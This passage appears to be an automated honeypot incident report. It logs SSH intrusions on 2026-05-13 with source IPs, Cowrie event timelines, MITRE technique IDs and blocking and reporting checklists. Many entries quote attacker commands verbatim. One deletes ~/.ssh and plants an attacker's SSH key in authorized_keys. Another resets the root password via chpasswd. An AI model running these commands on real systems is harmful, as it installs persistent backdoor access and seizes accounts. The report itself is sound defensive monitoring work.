| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-13 11:42 |
| **Last Seen** | 2026-05-13 11:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:42:20` | `cowrie.session.connect` |
| `2026-05-13 11:42:20` | `cowrie.client.version` |
| `2026-05-13 11:42:20` | `cowrie.client.kex` |
| `2026-05-13 11:42:20` | `cowrie.login.success` |
| `2026-05-13 11:42:21` | `cowrie.session.params` |
| `2026-05-13 11:42:21` | `cowrie.command.input` |
| `2026-05-13 11:42:21` | `cowrie.command.failed` |
| `2026-05-13 11:42:21` | `cowrie.log.closed` |
| `2026-05-13 11:42:21` | `cowrie.session.params` |
| `2026-05-13 11:42:21` | `cowrie.command.input` |
| `2026-05-13 11:42:21` | `cowrie.session.file_download` |
| `2026-05-13 11:42:21` | `cowrie.log.closed` |
| `2026-05-13 11:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2e8b6ce4e1d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-13 11:42 |
| **Last Seen** | 2026-05-13 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:42:23` | `cowrie.session.connect` |
| `2026-05-13 11:42:23` | `cowrie.client.version` |
| `2026-05-13 11:42:23` | `cowrie.client.kex` |
| `2026-05-13 11:42:23` | `cowrie.login.success` |
| `2026-05-13 11:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc316086e6ba

| Field | Detail |
|---|---|
| **Source IP** | `35.200.126[.]118` |
| **First Seen** | 2026-05-13 12:42 |
| **Last Seen** | 2026-05-13 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 12:42:04` | `cowrie.session.connect` |
| `2026-05-13 12:42:04` | `cowrie.client.version` |
| `2026-05-13 12:42:04` | `cowrie.client.kex` |
| `2026-05-13 12:42:04` | `cowrie.login.success` |
| `2026-05-13 12:42:05` | `cowrie.session.params` |
| `2026-05-13 12:42:05` | `cowrie.command.input` |
| `2026-05-13 12:42:05` | `cowrie.log.closed` |
| `2026-05-13 12:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.200.126[.]118` to AbuseIPDB if not already reported
- [ ] Block `35.200.126[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28bd6cd65193

| Field | Detail |
|---|---|
| **Source IP** | `35.200.126[.]118` |
| **First Seen** | 2026-05-13 12:42 |
| **Last Seen** | 2026-05-13 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 12:42:04` | `cowrie.session.connect` |
| `2026-05-13 12:42:04` | `cowrie.client.version` |
| `2026-05-13 12:42:04` | `cowrie.client.kex` |
| `2026-05-13 12:42:04` | `cowrie.login.success` |
| `2026-05-13 12:42:05` | `cowrie.session.params` |
| `2026-05-13 12:42:05` | `cowrie.command.input` |
| `2026-05-13 12:42:05` | `cowrie.log.closed` |
| `2026-05-13 12:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.200.126[.]118` to AbuseIPDB if not already reported
- [ ] Block `35.200.126[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176edae9d082

| Field | Detail |
|---|---|
| **Source IP** | `106.74.21[.]237` |
| **First Seen** | 2026-05-13 12:53 |
| **Last Seen** | 2026-05-13 12:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 12:53:02` | `cowrie.session.connect` |
| `2026-05-13 12:53:02` | `cowrie.client.version` |
| `2026-05-13 12:53:02` | `cowrie.client.kex` |
| `2026-05-13 12:53:04` | `cowrie.login.success` |
| `2026-05-13 12:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.74.21[.]237` to AbuseIPDB if not already reported
- [ ] Block `106.74.21[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c527077ef3bc

| Field | Detail |
|---|---|
| **Source IP** | `114.242.24[.]31` |
| **First Seen** | 2026-05-13 12:59 |
| **Last Seen** | 2026-05-13 13:04 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:oASpcCgQ57yJ"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 12:59:14` | `cowrie.session.connect` |
| `2026-05-13 12:59:14` | `cowrie.client.version` |
| `2026-05-13 12:59:15` | `cowrie.client.kex` |
| `2026-05-13 12:59:15` | `cowrie.login.success` |
| `2026-05-13 12:59:15` | `cowrie.session.params` |
| `2026-05-13 12:59:15` | `cowrie.command.input` |
| `2026-05-13 12:59:15` | `cowrie.command.failed` |
| `2026-05-13 12:59:16` | `cowrie.log.closed` |
| `2026-05-13 12:59:16` | `cowrie.session.params` |
| `2026-05-13 12:59:16` | `cowrie.command.input` |
| `2026-05-13 12:59:16` | `cowrie.session.file_download` |
| `2026-05-13 12:59:16` | `cowrie.log.closed` |
| `2026-05-13 12:59:27` | `cowrie.session.params` |
| `2026-05-13 12:59:27` | `cowrie.command.input` |
| `2026-05-13 12:59:27` | `cowrie.log.closed` |
| `2026-05-13 12:59:28` | `cowrie.session.params` |
| `2026-05-13 12:59:28` | `cowrie.command.input` |
| `2026-05-13 13:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.242.24[.]31` to AbuseIPDB if not already reported
- [ ] Block `114.242.24[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af968cc6b2a

| Field | Detail |
|---|---|
| **Source IP** | `61.240.156[.]16` |
| **First Seen** | 2026-05-13 12:59 |
| **Last Seen** | 2026-05-13 13:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 12:59:56` | `cowrie.session.connect` |
| `2026-05-13 12:59:56` | `cowrie.client.version` |
| `2026-05-13 12:59:56` | `cowrie.client.kex` |
| `2026-05-13 12:59:57` | `cowrie.login.success` |
| `2026-05-13 12:59:57` | `cowrie.session.params` |
| `2026-05-13 12:59:57` | `cowrie.command.input` |
| `2026-05-13 12:59:57` | `cowrie.command.failed` |
| `2026-05-13 12:59:57` | `cowrie.log.closed` |
| `2026-05-13 12:59:58` | `cowrie.session.params` |
| `2026-05-13 12:59:58` | `cowrie.command.input` |
| `2026-05-13 12:59:58` | `cowrie.session.file_download` |
| `2026-05-13 12:59:58` | `cowrie.log.closed` |
| `2026-05-13 13:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.156[.]16` to AbuseIPDB if not already reported
- [ ] Block `61.240.156[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea6c6a25b9c

| Field | Detail |
|---|---|
| **Source IP** | `61.240.156[.]16` |
| **First Seen** | 2026-05-13 13:00 |
| **Last Seen** | 2026-05-13 13:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:00:00` | `cowrie.session.connect` |
| `2026-05-13 13:00:00` | `cowrie.client.version` |
| `2026-05-13 13:00:00` | `cowrie.client.kex` |
| `2026-05-13 13:00:01` | `cowrie.login.success` |
| `2026-05-13 13:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.156[.]16` to AbuseIPDB if not already reported
- [ ] Block `61.240.156[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d229c351a0d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.119[.]184` |
| **First Seen** | 2026-05-13 13:02 |
| **Last Seen** | 2026-05-13 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:02:23` | `cowrie.session.connect` |
| `2026-05-13 13:02:23` | `cowrie.client.version` |
| `2026-05-13 13:02:23` | `cowrie.client.kex` |
| `2026-05-13 13:02:24` | `cowrie.login.success` |
| `2026-05-13 13:02:24` | `cowrie.session.params` |
| `2026-05-13 13:02:24` | `cowrie.command.input` |
| `2026-05-13 13:02:24` | `cowrie.command.failed` |
| `2026-05-13 13:02:24` | `cowrie.log.closed` |
| `2026-05-13 13:02:24` | `cowrie.session.params` |
| `2026-05-13 13:02:24` | `cowrie.command.input` |
| `2026-05-13 13:02:24` | `cowrie.session.file_download` |
| `2026-05-13 13:02:24` | `cowrie.log.closed` |
| `2026-05-13 13:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.119[.]184` to AbuseIPDB if not already reported
- [ ] Block `101.36.119[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f040125fedbf

| Field | Detail |
|---|---|
| **Source IP** | `101.36.119[.]184` |
| **First Seen** | 2026-05-13 13:02 |
| **Last Seen** | 2026-05-13 13:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:02:26` | `cowrie.session.connect` |
| `2026-05-13 13:02:26` | `cowrie.client.version` |
| `2026-05-13 13:02:26` | `cowrie.client.kex` |
| `2026-05-13 13:02:27` | `cowrie.login.success` |
| `2026-05-13 13:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.119[.]184` to AbuseIPDB if not already reported
- [ ] Block `101.36.119[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7acb358c37

| Field | Detail |
|---|---|
| **Source IP** | `80.253.31[.]232` |
| **First Seen** | 2026-05-13 13:06 |
| **Last Seen** | 2026-05-13 13:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:06:01` | `cowrie.session.connect` |
| `2026-05-13 13:06:01` | `cowrie.client.version` |
| `2026-05-13 13:06:02` | `cowrie.client.kex` |
| `2026-05-13 13:06:02` | `cowrie.login.success` |
| `2026-05-13 13:06:03` | `cowrie.session.params` |
| `2026-05-13 13:06:03` | `cowrie.command.input` |
| `2026-05-13 13:06:03` | `cowrie.command.failed` |
| `2026-05-13 13:06:03` | `cowrie.log.closed` |
| `2026-05-13 13:06:03` | `cowrie.session.params` |
| `2026-05-13 13:06:03` | `cowrie.command.input` |
| `2026-05-13 13:06:03` | `cowrie.session.file_download` |
| `2026-05-13 13:06:03` | `cowrie.log.closed` |
| `2026-05-13 13:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.253.31[.]232` to AbuseIPDB if not already reported
- [ ] Block `80.253.31[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f5eef476592

| Field | Detail |
|---|---|
| **Source IP** | `80.253.31[.]232` |
| **First Seen** | 2026-05-13 13:06 |
| **Last Seen** | 2026-05-13 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:06:06` | `cowrie.session.connect` |
| `2026-05-13 13:06:06` | `cowrie.client.version` |
| `2026-05-13 13:06:06` | `cowrie.client.kex` |
| `2026-05-13 13:06:07` | `cowrie.login.success` |
| `2026-05-13 13:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.253.31[.]232` to AbuseIPDB if not already reported
- [ ] Block `80.253.31[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5acb8de7d2ac

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-05-13 13:06 |
| **Last Seen** | 2026-05-13 13:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:06:36` | `cowrie.session.connect` |
| `2026-05-13 13:06:36` | `cowrie.client.version` |
| `2026-05-13 13:06:37` | `cowrie.client.kex` |
| `2026-05-13 13:06:39` | `cowrie.login.success` |
| `2026-05-13 13:06:39` | `cowrie.session.params` |
| `2026-05-13 13:06:39` | `cowrie.command.input` |
| `2026-05-13 13:06:39` | `cowrie.command.failed` |
| `2026-05-13 13:06:40` | `cowrie.log.closed` |
| `2026-05-13 13:06:40` | `cowrie.session.params` |
| `2026-05-13 13:06:40` | `cowrie.command.input` |
| `2026-05-13 13:06:41` | `cowrie.session.file_download` |
| `2026-05-13 13:06:41` | `cowrie.log.closed` |
| `2026-05-13 13:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea2d948d8d4

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-05-13 13:06 |
| **Last Seen** | 2026-05-13 13:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:06:44` | `cowrie.session.connect` |
| `2026-05-13 13:06:44` | `cowrie.client.version` |
| `2026-05-13 13:06:45` | `cowrie.client.kex` |
| `2026-05-13 13:06:46` | `cowrie.login.success` |
| `2026-05-13 13:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cc8badeba6

| Field | Detail |
|---|---|
| **Source IP** | `221.161.235[.]168` |
| **First Seen** | 2026-05-13 13:07 |
| **Last Seen** | 2026-05-13 13:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:07:40` | `cowrie.session.connect` |
| `2026-05-13 13:07:40` | `cowrie.client.version` |
| `2026-05-13 13:07:40` | `cowrie.client.kex` |
| `2026-05-13 13:07:41` | `cowrie.login.success` |
| `2026-05-13 13:07:41` | `cowrie.session.params` |
| `2026-05-13 13:07:41` | `cowrie.command.input` |
| `2026-05-13 13:07:41` | `cowrie.command.failed` |
| `2026-05-13 13:07:41` | `cowrie.log.closed` |
| `2026-05-13 13:07:41` | `cowrie.session.params` |
| `2026-05-13 13:07:41` | `cowrie.command.input` |
| `2026-05-13 13:07:42` | `cowrie.session.file_download` |
| `2026-05-13 13:07:42` | `cowrie.log.closed` |
| `2026-05-13 13:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.161.235[.]168` to AbuseIPDB if not already reported
- [ ] Block `221.161.235[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9063f75a1f

| Field | Detail |
|---|---|
| **Source IP** | `221.161.235[.]168` |
| **First Seen** | 2026-05-13 13:07 |
| **Last Seen** | 2026-05-13 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:07:44` | `cowrie.session.connect` |
| `2026-05-13 13:07:44` | `cowrie.client.version` |
| `2026-05-13 13:07:44` | `cowrie.client.kex` |
| `2026-05-13 13:07:44` | `cowrie.login.success` |
| `2026-05-13 13:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.161.235[.]168` to AbuseIPDB if not already reported
- [ ] Block `221.161.235[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe333b8ba2a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]198` |
| **First Seen** | 2026-05-13 13:53 |
| **Last Seen** | 2026-05-13 13:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 13:53:52` | `cowrie.session.connect` |
| `2026-05-13 13:53:52` | `cowrie.client.version` |
| `2026-05-13 13:53:52` | `cowrie.client.kex` |
| `2026-05-13 13:53:52` | `cowrie.login.success` |
| `2026-05-13 13:53:53` | `cowrie.session.params` |
| `2026-05-13 13:53:53` | `cowrie.command.input` |
| `2026-05-13 13:53:53` | `cowrie.command.failed` |
| `2026-05-13 13:53:53` | `cowrie.log.closed` |
| `2026-05-13 13:53:53` | `cowrie.session.params` |
| `2026-05-13 13:53:53` | `cowrie.command.input` |
| `2026-05-13 13:53:53` | `cowrie.session.file_download` |
| `2026-05-13 13:53:53` | `cowrie.log.closed` |
| `2026-05-13 13:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]198` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]198` at perimeter firewall / security group
